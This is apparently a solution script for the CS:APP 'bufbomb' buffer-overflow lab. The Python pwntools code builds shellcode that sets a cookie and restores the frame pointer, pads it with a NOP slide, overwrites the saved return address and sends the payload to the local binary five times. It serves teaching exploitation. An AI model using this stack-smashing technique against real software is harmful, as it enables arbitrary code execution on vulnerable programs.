from pwn import *

f = open("./ID", "r")
id = f.read().splitlines()[0]
f.close()

sh = process(['./bufbomb', '-u', id, '-n'])

length = 512
ebp = 0x556834a0
ret = 0x08048e15
cookie = 0x274adc8a
distance = 0x28 # distance from esp to previous ebp
nop = chr(0x90)

shellcode = asm('mov eax, ' + str(cookie) + '; lea ebp, [esp + ' + str(distance) + ']; push ' + str(ret) + '; ret;')

exploit = flat([shellcode.rjust(length + 8, nop), 0xdeadbeef, ebp - length / 2]) # NOP slide

print ' '.join(char.encode("hex") for char in exploit)

for _ in range(5):
    sh.sendline(exploit)
    print sh.recv()

sh.interactive()